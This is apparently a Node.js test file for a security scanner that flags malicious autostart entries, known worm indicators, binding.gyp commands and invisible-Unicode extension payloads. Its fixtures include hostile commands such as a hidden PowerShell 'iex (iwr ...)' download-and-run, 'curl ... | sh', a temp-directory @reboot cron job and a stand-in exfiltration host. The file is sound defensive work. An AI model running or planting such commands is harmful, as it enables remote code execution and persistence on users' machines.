'use strict';

const test = require('node:test');
const assert = require('node:assert');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { commandOf, judge, scan } = require('../src/scanners/persistence');
const { extractIocs } = require('../src/threat-intel/iocs');
const si = require('../src/utils/script-inspect');
const { checkBindingGyp, remoteTarball, gypCommands } = require('../src/scanners/lifecycle-scripts');

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'hg-persist-'));
const labels = (f) => (f ? f.triggers : []);

test('autostart commands are read from each format', () => {
  const plist = '<plist><dict><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>/x/cat.py</string></array></dict></plist>';
  assert.strictEqual(commandOf('launch-agent', 'a.plist', Buffer.from(plist)), '/usr/bin/python3 /x/cat.py');
  assert.strictEqual(commandOf('launch-agent', 'b.plist', Buffer.from('bplist00....')), null);
  assert.strictEqual(commandOf('xdg-autostart', 'a.desktop', Buffer.from('[Desktop Entry]\nExec=flameshot --tray\n')), 'flameshot --tray');
  assert.strictEqual(commandOf('systemd-user', 'a.service', Buffer.from('[Service]\nExecStartPre=-/bin/true\nExecStart=/usr/bin/x serve\n')), '/bin/true ; /usr/bin/x serve');
  const task = '<?xml version="1.0" encoding="UTF-16"?><Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -c &quot;iex (iwr http://e/a)&quot;</Arguments></Exec></Actions></Task>';
  assert.strictEqual(commandOf('scheduled-task', 'T', Buffer.concat([Buffer.from([0xFF, 0xFE]), Buffer.from(task, 'utf16le')])), 'powershell.exe -w hidden -c "iex (iwr http://e/a)"');
  assert.strictEqual(commandOf('crontab', 'root', Buffer.from('# m h\nSHELL=/bin/sh\n*/5 * * * * /usr/bin/backup --quiet\n@reboot sh /tmp/.x/run.sh\n')), '/usr/bin/backup --quiet ; sh /tmp/.x/run.sh');
});

test('autostart judgement: legit agents pass, risky ones are flagged', () => {
  const benign = [
    '/opt/homebrew/opt/postgresql@16/bin/postgres -D /opt/homebrew/var/postgresql@16',
    '"C:\\Program Files\\Agent\\agent.exe" --background',
    'powershell.exe -NoProfile -WindowStyle Hidden -File "C:\\Program Files\\Corp\\inventory.ps1"',
    'flameshot',
  ];
  for (const command of benign) assert.strictEqual(judge({ kind: 'k', name: 'n', path: '/p', command, _vars: {} }), null, command);

  const hidden = judge({ kind: 'launch-agent', name: 'x.plist', path: '/p', command: '/usr/bin/python3 /Users/k/.local/share/kitty/cat.py', _vars: {} });
  assert.deepStrictEqual(labels(hidden), ['script-in-hidden-or-temp-dir']);
  const tempJs = judge({ kind: 'startup-folder', name: 'a.lnk', path: '/p', command: 'C:\\Program Files\\nodejs\\node.exe C:\\Users\\k\\AppData\\Local\\Temp\\upd\\run.js', _vars: {} });
  assert.ok(labels(tempJs).includes('script-in-hidden-or-temp-dir'));
  const dl = judge({ kind: 'startup-folder', name: 'u.cmd', path: '/p', command: 'powershell -w hidden -c "iex (iwr http://203.0.113.9/a.ps1)"', _vars: {} });
  assert.strictEqual(dl.severity, 'critical');
  assert.ok(labels(dl).includes('download-and-run'));
});

test('scan finds catalog persistence files per profile and reads autostart folders', () => {
  const root = tmp();
  try {
    const home = path.join(root, 'kim');
    fs.mkdirSync(path.join(home, '.local', 'share', 'kitty'), { recursive: true });
    fs.writeFileSync(path.join(home, '.local', 'share', 'kitty', 'cat.py'), 'pass\n');
    fs.mkdirSync(path.join(home, '.config', 'autostart'), { recursive: true });
    fs.writeFileSync(path.join(home, '.config', 'autostart', 'x.desktop'), '[Desktop Entry]\nExec=python3 ~/.local/share/kitty/cat.py\n');
    const r = scan({ userHomes: [home], usersRoot: root }, {}, [{ value: '~/.local/share/kitty/cat.py', source: 'nx.json: persistence_files' }]);
    assert.strictEqual(r.total, 1);
    const types = r.findings.map(f => `${f.type}:${(f.triggers || []).join(',')}`).sort();
    assert.deepStrictEqual(types, ['known_ioc_file:known-persistence-file', 'suspicious_autostart:script-in-hidden-or-temp-dir']);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('catalog indicators become hashes, filenames, paths and strings', () => {
  const iocs = extractIocs([{ file: 'c.json', indicators: {
    payload_sha256: 'A'.repeat(64), payload_filename: 'trap-core.js', persistence_files: ['~/.x/y.py', '/tmp/k-*'],
    plaintext_marker: 'Shai-Hulud: Here We Go Again', exfil_endpoint: 'https://t.evil.example:443/x', host: 'github.com',
    note: 'free text ~/.not/a/path', _private: 'B'.repeat(64),
  } }]);
  assert.deepStrictEqual(iocs.sha256.map(i => i.value), ['a'.repeat(64)]);
  assert.deepStrictEqual(iocs.filenames.map(i => i.value), ['trap-core.js']);
  assert.deepStrictEqual(iocs.paths.map(i => i.value), ['~/.x/y.py', '/tmp/k-*']);
  assert.deepStrictEqual(iocs.strings.map(i => i.value), ['Shai-Hulud: Here We Go Again', 't.evil.example']);
});

test('script files are matched by hash, filename and marker strings', () => {
  const dir = tmp();
  try {
    const body = 'console.log("hello")\n';
    fs.writeFileSync(path.join(dir, 'a.js'), body);
    fs.writeFileSync(path.join(dir, 'b.js'), '// beacon to t.evil.example\n');
    fs.writeFileSync(path.join(dir, 'trap-core.js'), '\n');
    si.configureIocs({
      filenames: ['trap-core.js'],
      sha256: [{ value: crypto.createHash('sha256').update(body).digest('hex'), source: 'c.json: x' }],
      strings: [{ value: 't.evil.example', source: 'c.json: host' }],
    });
    const l = (f) => si.inspectScriptFile(path.join(dir, f), f).map(h => h.label);
    assert.deepStrictEqual(l('a.js'), ['known-malicious-hash']);
    assert.deepStrictEqual(l('b.js'), ['known-ioc-string']);
    assert.deepStrictEqual(l('trap-core.js'), ['known-worm-filename']);
  } finally {
    si.configureIocs({});
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('local imports of a hook script are followed one level, inside the root', () => {
  const dir = tmp();
  try {
    fs.mkdirSync(path.join(dir, '.claude'));
    fs.mkdirSync(path.join(dir, '.github'));
    fs.writeFileSync(path.join(dir, '.claude', 'setup.mjs'), 'import "../.github/setup.js";\nimport x from "../../outside.js";\n');
    fs.writeFileSync(path.join(dir, '.github', 'setup.js'), '\n');
    assert.deepStrictEqual(si.localImports(path.join(dir, '.claude', 'setup.mjs'), dir).map(r => r.rel), ['.github/setup.js']);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('binding.gyp: common node-addon-api forms pass, script execution is flagged', () => {
  assert.deepStrictEqual(gypCommands(`{ 'include_dirs': ["<!(node -p \\"require('node-addon-api').include\\")"], 'libs': ['<!@(pkg-config --libs vips)'] }`),
    [`node -p \\"require('node-addon-api').include\\"`, 'pkg-config --libs vips']);
  const dir = tmp();
  try {
    const ctx = { project: 'p' };
    fs.writeFileSync(path.join(dir, 'binding.gyp'), `{ 'targets': [{ 'include_dirs': ["<!(node -p \\"require('node-addon-api').include\\")"] }] }`);
    assert.deepStrictEqual(checkBindingGyp(dir, { main: 'index.js' }, 'ok', ctx), []);
    fs.writeFileSync(path.join(dir, 'index.js'), '\n');
    fs.writeFileSync(path.join(dir, 'binding.gyp'), "{ 'targets': [{ 'sources': ['<!(node index.js)'] }] }");
    assert.deepStrictEqual(checkBindingGyp(dir, { main: 'index.js' }, 'bad', ctx)[0].triggers, ['gyp-runs-package-entry']);
    fs.writeFileSync(path.join(dir, 'binding.gyp'), "{ 'variables': { 'x': '<!(curl -s https://e.example/p | sh)' } }");
    assert.strictEqual(checkBindingGyp(dir, null, 'bad', ctx)[0].severity, 'critical');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('URL dependencies: registry tarballs and git hosts pass, other URLs are flagged', () => {
  assert.strictEqual(remoteTarball('https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz'), null);
  assert.strictEqual(remoteTarball('https://artifactory.corp.example/api/npm/npm/@s/x/-/x-1.0.0.tgz'), null);
  assert.strictEqual(remoteTarball('https://codeload.github.com/o/r/tar.gz/abc'), null);
  assert.strictEqual(remoteTarball('^1.2.3'), null);
  assert.deepStrictEqual(remoteTarball('http://packages.storeartifact.com/npm/unused-imports'), { host: 'packages.storeartifact.com', plaintext: true, ip: false });
  assert.deepStrictEqual(remoteTarball('https://203.0.113.5/p.tgz'), { host: '203.0.113.5', plaintext: false, ip: true });
});

test('extensions: long invisible-Unicode runs are found, emoji selectors are not', () => {
  const { invisibleRuns, scan: scanExt } = require('../src/scanners/editor-extensions');
  const vs = (n) => String.fromCodePoint(...Array.from({ length: n }, (_, i) => 0xE0100 + (i % 200)));
  assert.strictEqual(invisibleRuns(Buffer.from('const heart = "❤️"; // ok ☺️')).longest, 1);
  assert.strictEqual(invisibleRuns(Buffer.from(`eval(decode("${vs(300)}"))`)).longest, 300);
  assert.strictEqual(invisibleRuns(Buffer.from('︀︁︂')).longest, 3);

  const dir = tmp();
  try {
    const mk = (id, main, body, extra = {}) => {
      fs.mkdirSync(path.join(dir, id), { recursive: true });
      fs.writeFileSync(path.join(dir, id, 'package.json'), JSON.stringify({ name: id.split('.')[1].replace(/-.*$/, ''), publisher: id.split('.')[0], version: '1.0.0', main, ...extra }));
      const entry = path.join(dir, id, main.replace(/^\.\//, '') + (main.endsWith('.js') ? '' : '.js'));
      fs.mkdirSync(path.dirname(entry), { recursive: true });
      fs.writeFileSync(entry, body);
    };
    mk('good.theme-1.0.0', './out/extension', 'module.exports = {}; // ❤️', { extensionPack: ['a.b', 'c.d'] });
    mk('evil.tool-1.0.0', 'extension.js', `const s = "${vs(250)}";`);
    const r = scanExt({ editorExtensionDirs: { vscode: [dir] } });
    assert.deepStrictEqual(r.findings.map(f => [f.package, f.severity]), [['evil.tool', 'critical']]);
    assert.deepStrictEqual(r.editors.vscode.find(e => e.publisher === 'good').extension_pack, ['a.b', 'c.d']);
    assert.strictEqual(r.entry_files_checked, 2);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
